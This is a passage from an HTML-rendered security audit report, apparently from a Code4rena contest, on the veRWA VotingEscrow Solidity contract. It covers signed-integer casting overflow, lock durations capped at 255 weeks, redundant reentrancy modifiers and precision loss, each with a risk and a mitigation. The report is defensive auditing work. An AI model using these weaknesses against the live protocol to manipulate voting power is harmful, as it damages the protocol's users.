href=\"https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L129-L136\">https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L129-L136</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"41\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// When a huge deposit is made, the casting of _value in createLock can allow delegated to overflow into negative a value...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_oldLocked</span><span class=\"mtk1\">.</span><span class=\"mtk12\">end</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">_oldLocked</span><span class=\"mtk1\">.</span><span class=\"mtk12\">delegated</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// ...these can become negative as a result</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">userOldPoint</span><span class=\"mtk1\">.</span><span class=\"mtk12\">slope</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_oldLocked</span><span class=\"mtk1\">.</span><span class=\"mtk12\">delegated</span><span class=\"mtk1\"> / </span><span class=\"mtk11\">int128</span><span class=\"mtk1\">(</span><span class=\"mtk11\">int256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">LOCKTIME</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">userOldPoint</span><span class=\"mtk1\">.</span><span class=\"mtk12\">bias</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">userOldPoint</span><span class=\"mtk1\">.</span><span class=\"mtk12\">slope</span><span class=\"mtk1\"> * </span><span class=\"mtk11\">int128</span><span class=\"mtk1\">(</span><span class=\"mtk11\">int256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_oldLocked</span><span class=\"mtk1\">.</span><span class=\"mtk12\">end</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_newLocked</span><span class=\"mtk1\">.</span><span class=\"mtk12\">end</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">_newLocked</span><span class=\"mtk1\">.</span><span class=\"mtk12\">delegated</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// ...these can become negative as a result</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">userNewPoint</span><span class=\"mtk1\">.</span><span class=\"mtk12\">slope</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_newLocked</span><span class=\"mtk1\">.</span><span class=\"mtk12\">delegated</span><span class=\"mtk1\"> / </span><span class=\"mtk11\">int128</span><span class=\"mtk1\">(</span><span class=\"mtk11\">int256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">LOCKTIME</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">userNewPoint</span><span class=\"mtk1\">.</span><span class=\"mtk12\">bias</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">userNewPoint</span><span class=\"mtk1\">.</span><span class=\"mtk12\">slope</span><span class=\"mtk1\"> * </span><span class=\"mtk11\">int128</span><span class=\"mtk1\">(</span><span class=\"mtk11\">int256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_newLocked</span><span class=\"mtk1\">.</span><span class=\"mtk12\">end</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<h3 id=\"risk-1\" style=\"position:relative;\"><a href=\"#risk-1\" aria-label=\"risk 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Risk</h3>\n<p>Control over the sign of <code>bias</code> and <code>slope</code> allows for the control of decay of voting power, because at any point they become &#x3C; 0, they are reset to 0, giving the theoretical attacker the ability to temporarily stem the decay of their voting power.</p>\n<h3 id=\"mitigation-1\" style=\"position:relative;\"><a href=\"#mitigation-1\" aria-label=\"mitigation 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Mitigation</h3>\n<p>Similar to “Casting between types makes values negative for huge input values”, bypass the need to cast (and automatically hard-lock values to 0) by using unsigned types with guards for relevant pre-conditions that ensure negative-valued outcomes are not permissible in calls to <code>createLock()</code> and <code>increaseLock()</code>.</p>\n<h2 id=\"03-inconsistent-lock-durations\" style=\"position:relative;\"><a href=\"#03-inconsistent-lock-durations\" aria-label=\"03 inconsistent lock durations permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[03] Inconsistent Lock Durations</h2>\n<p>Locks for veRWA are set for 5 years, given no further actions on a lock are performed.  This 5 year period is an important duration, because it also determines the calculations for the decay in voting power a lock has.  In <code>**VotingEscrow.sol**</code>, the 5 year lock period is measured as 1825 days.  </p>\n<p>Places where the 1785 day measurement is used:</p>\n<ul>\n<li>in <code>_checkpoint()</code>, line 185</li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"42\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk7\">255</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">iterativeTime</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">iterativeTime</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">WEEK</span><span class=\"mtk1\">; </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">iterativeTime</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t    </span><span class=\"mtk12\">lastPoint</span><span class=\"mtk1\">.</span><span class=\"mtk12\">blk</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">number</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t    </span><span class=\"mtk15\">break</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t} ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<ul>\n<li>in <code>_supplyAt()</code>, line 538</li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"43\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_supplyAt</span><span class=\"mtk1\">(..., </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_t</span><span class=\"mtk1\">) ... {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk7\">255</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">iterativeTime</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">iterativeTime</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">WEEK</span><span class=\"mtk1\">; </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">iterativeTime</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">_t</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t    </span><span class=\"mtk15\">break</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<h3 id=\"risk-2\" style=\"position:relative;\"><a href=\"#risk-2\" aria-label=\"risk 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Risk</h3>\n<p>There is a possibility that the protocol faces a case where locked funds are untouched and no new funds are locked across  a 5 year period.  In this “last users standing” scenario, the protocol theoretically is still responsible for calculating the final voting weights, allowing investors to maximize the utility of their locked funds regardless of the relevancy of the protocol.</p>\n<p>Surprisingly, the maximum span the protocol can actually measure is less than 5 years, it is 255 weeks, which equates to 1785 days.  For those final 40 days and afterwards, for example, weights will be miscalculated, and, especially depending on the size of the funds locked, returns on those funds or supply totals will be miscalculated.</p>\n<h3 id=\"mitigation-2\" style=\"position:relative;\"><a href=\"#mitigation-2\" aria-label=\"mitigation 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Mitigation</h3>\n<p>Increase the number of iterations to fully calculate weights through the 5 year period.</p>\n<h2 id=\"04-unnecessary-modifiers-cost-gas\" style=\"position:relative;\"><a href=\"#04-unnecessary-modifiers-cost-gas\" aria-label=\"04 unnecessary modifiers cost gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[04] Unnecessary Modifiers Cost Gas</h2>\n<p>Reentrancy is a common root-cause for exploits in smart contracts.  To avoid the specific case of basic reentrancy, a <code>nonReentrant</code> modifier is often used.  In the case of a handful of functions in <strong><code>VotingEscrow.sol</code>,</strong> this modifier is unnecessary, because the cause of reentrancy - calling into external contracts - is also missing.  While they are not a risk, they do cause extra computation, and thus raise gas costs, which may be of some notice especially during high network congestion.</p>\n<p>Locations where they exist:</p>\n<ul>\n<li>Line 268:</li>\n</ul>\n<p><a href=\"https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L268\">https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L268</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"44\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">createLock</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_value</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">payable</span><span class=\"mtk1\"> </span><span class=\"mtk11\">nonReentrant</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<ul>\n<li>Line 288:</li>\n</ul>\n<p><a href=\"https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L288\">https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L288</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"45\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">increaseAmount</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_value</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">payable</span><span class=\"mtk1\"> </span><span class=\"mtk11\">nonReentrant</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<ul>\n<li>Line 326:</li>\n</ul>\n<p><a href=\"https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L326C5-L326C48\">https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L326C5-L326</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"46\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">withdraw</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">nonReentrant</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<ul>\n<li>Line 356:</li>\n</ul>\n<p><a href=\"https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L356\">https://github.com/code-423n4/2023-08-verwa/blob/a693b4db05b9e202816346a6f9cada94f28a2698/src/VotingEscrow.sol#L356</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"47\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">delegate</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_addr</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">nonReentrant</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<h3 id=\"risk-3\" style=\"position:relative;\"><a href=\"#risk-3\" aria-label=\"risk 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Risk</h3>\n<p>No identified risk, since no external contract calls are made in these functions. However there is the cost of computation from running the modifiers during each call, thus increasing gas costs.</p>\n<h3 id=\"mitigation-3\" style=\"position:relative;\"><a href=\"#mitigation-3\" aria-label=\"mitigation 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Mitigation</h3>\n<p>Remove the modifiers from the function definitions.</p>\n<h2 id=\"05-many-cases-of-precision-loss-from-multiply-after-divide\" style=\"position:relative;\"><a href=\"#05-many-cases-of-precision-loss-from-multiply-after-divide\" aria-label=\"05 many cases of precision loss from multiply after divide permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[05] Many cases of precision loss from multiply-after-divide</h2>\n<p>While there wasn’t enough time to explore possible attack vectors for these cases, it’s apparent that there is definite loss in precision while calculating important values in the system.  </p>\n<ul>\n<li>From <code>_checkpoint()</code> in <code>VotingEscrow.sol</code>, lines 129 - 132:</li>\n</ul>\n<p><a href=\"https://github.com/code-423n4/2023-08-verwa/blob/9a2e7be003bc1a77b3b87db31f3d5a1bcb48ed32/src/VotingEscrow.sol#L129-L132\">https://github.com/code-423n4/2023-08-verwa/blob/9a2e7be003bc1a77b3b87db31f3d5a1bcb48ed32/src/VotingEscrow.sol#L129-L132</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"48\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_oldLocked</span><span class=\"mtk1\">.</span><span class=\"mtk12\">end</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">_oldLocked</span><span class=\"mtk1\">.</span><span class=\"mtk12\">delegated</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">userOldPoint</span><span class=\"mtk1\">.</span><span class=\"mtk12\">slope</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_oldLocked</span><span class=\"mtk1\">.</span><span class=\"mtk12\">delegated</span><span class=\"mtk1\"> / </span><span class=\"mtk11\">int128</span><span class=\"mtk1\">(</span><span class=\"mtk11\">int256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">LOCKTIME</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">userOldPoint</span><span class=\"mtk1\">.</span><span class=\"mtk12\">bias</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">userOldPoint</span><span class=\"mtk1\">.</span><span class=\"mtk12\">slope</span><span class=\"mtk1\"> * </span><span class=\"mtk11\">int128</span><span class=\"mtk1\">(</span><span class=\"mtk11\">int256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_oldLocked</span><span class=\"mtk1\">.</span><span class=\"mtk12\">end</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<ul>\n<li>From <code>_checkpoint()</code> in <code>VotingEscrow.sol</code>, lines 133 - 136:</li>\n</ul>\n<p><a href=\"https://github.com/code-423n4/2023-08-verwa/blob/9a2e7be003bc1a77b3b87db31f3d5a1bcb48ed32/src/VotingEscrow.sol#L133-L136\">https://github.com/code-423n4/2023-08-verwa/blob/9a2e7be003bc1a77b3b87db31f3d5a1bcb48ed32/src/VotingEscrow.sol#L133-L136</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"49\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_newLocked</span><span class=\"mtk1\">.</span><span class=\"mtk12\">end</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">_newLocked</span><span class=\"mtk1\">.</span><span class=\"mtk12\">delegated</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">userNewPoint</span><span class=\"mtk1\">.</span><span class=\"mtk12\">slope</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_newLocked</span><span class=\"mtk1\">.</span><span class=\"mtk12\">delegated</span><span class=\"mtk1\"> / </span><span class=\"mtk11\">int128</span><span class=\"mtk1\">(</span><span class=\"mtk11\">int256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">LOCKTIME</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">userNewPoint</span><span class=\"mtk1\">.</span><span class=\"mtk12\">bias</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">userNewPoint</span><span class=\"mtk1\">.</span><span class=\"mtk12\">slope</span><span class=\"mtk1\"> * </span><span class=\"mtk11\">int128</span><span class=\"mtk1\">(</span><span class=\"mtk11\">int256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_newLocked</span><span class=\"mtk1\">.</span><span class=\"mtk12\">end</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<ul>\n<li>From <code>_checkpoint()</code> in <code>VotingEscrow.sol</code>, lines 176 - 218</li>\n</ul>\n<p><a href=\"https://github.com/code-423n4/2023-08-verwa/blob/9a2e7be003bc1a77b3b87db31f3d5a1bcb48ed32/src/VotingEscrow.sol#L176-L218\">https://github.com/code-423n4/2023-08-verwa/blob/9a2e7be003bc1a77b3b87db31f3d5a1bcb48ed32/src/VotingEscrow.sol#L176-L218</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"50\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">blockSlope</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; 